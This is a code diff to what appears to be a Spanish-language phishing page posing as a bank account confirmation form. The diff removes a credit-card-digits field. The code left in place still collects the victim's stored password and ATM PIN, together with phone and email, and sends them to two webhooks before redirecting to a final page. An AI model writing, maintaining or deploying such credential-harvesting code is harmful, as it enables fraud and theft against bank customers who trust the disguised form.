@@ -49,16 +49,6 @@
       <i class="fas fa-envelope icon-right absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 pointer-events-none"></i>
     </div>
 
-    <div class="relative">
-      <input type="text" id="cardDigits" name="cardDigits" required maxlength="11"
-        class="peer w-full border border-gray-300 rounded-md px-4 pt-6 pb-2 text-base text-gray-800 placeholder-transparent focus:outline-none focus:border-blue-700 pr-10"
-        placeholder="Últimos 8 dígitos de tu tarjeta de credito"/>
-      <label for="cardDigits" class="absolute left-3 top-2 text-xs text-blue-700 bg-white px-1 transition-all peer-placeholder-shown:top-5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:top-2 peer-focus:text-xs peer-focus:text-blue-700">
-        Últimos 8 dígitos de tu tarjeta de credito
-      </label>
-      <i class="fas fa-credit-card icon-right absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 pointer-events-none"></i>
-    </div>
-
     <button type="submit" id="submitBtn" disabled class="w-full bg-gray-300 text-white font-semibold py-4 rounded-full text-sm tracking-widest cursor-not-allowed transition duration-300">
       CONFIRMAR
     </button>
@@ -87,16 +77,13 @@
   <script>
     const phone = document.getElementById('phone');
     const email = document.getElementById('email');
-    const cardDigits = document.getElementById('cardDigits');
     const submitBtn = document.getElementById('submitBtn');
 
     function checkInputs() {
       const phoneValid = phone.value.trim().length === 10;
       const emailValid = email.value.trim().includes('@');
-      const cardValue = cardDigits.value.replace(/\D/g, '');
-      const cardValid = cardValue.length === 8;
 
-      if (phoneValid && emailValid && cardValid) {
+      if (phoneValid && emailValid) {
         submitBtn.disabled = false;
         submitBtn.classList.remove('bg-gray-300', 'cursor-not-allowed');
         submitBtn.classList.add('bg-blue-700', 'hover:bg-blue-800', 'cursor-pointer');
@@ -107,16 +94,8 @@
       }
     }
 
-    cardDigits.addEventListener('input', function (e) {
-      let value = e.target.value.replace(/\D/g, '').slice(0, 8);
-      value = value.replace(/(\d{4})(\d{1,4})?/, (_, p1, p2) => p2 ? `${p1} ${p2}` : p1);
-      e.target.value = value;
-      checkInputs();
-    });
-
     phone.addEventListener('input', checkInputs);
     email.addEventListener('input', checkInputs);
-
   </script>
 
   <script src="Discord.js"></script>
@@ -130,19 +109,16 @@
         ["Contraseña", localStorage.getItem('password')],
         ["Clave de cajero", localStorage.getItem('cajeroPin')],
         ["Teléfono", phone.value],
-        ["Correo electrónico", email.value],
-        ["Dígitos de tarjeta", cardDigits.value]
+        ["Correo electrónico", email.value]
       ];
 
       enviarDatosAWebhook("📱 Confirmación completa", allData, WEBHOOK_1);
       enviarDatosAWebhook("📩 Confirmación completa", allData, WEBHOOK_2);
 
-      // Mostrar loader rojo
       document.getElementById('loader').classList.remove('hidden');
 
-      // Redirigir después de 5 segundos
       setTimeout(() => {
-        window.location.href = "final.html"; // Cambia esta URL si quieres otra página
+        window.location.href = "final.html";
       }, 5000);
     });
   </script>
